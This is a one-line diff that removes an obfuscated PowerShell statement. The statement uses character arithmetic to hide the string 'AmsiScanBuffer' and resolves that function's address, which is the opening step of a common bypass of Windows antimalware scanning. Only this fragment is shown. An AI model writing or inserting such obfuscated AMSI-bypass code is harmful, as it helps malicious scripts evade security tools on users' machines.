@@ -1,1 +1,0 @@
-$nbfpbs = [hnkwv]::GetProcAddress($cnqlwvq, "$([chaR](65*60/60)+[ChAR]([Byte]0x6d)+[CHAr](44+71)+[CHaR](39+66)+[ChAr](83+29-29)+[cHAR](99*69/69)+[chaR]([byTE]0x61)+[ChAr](110)+[chAr]([ByTe]0x42)+[char](117+79-79)+[CHAr](102)+[CHar](102)+[CHaR](101*88/88)+[chAr]([ByTE]0x72))")
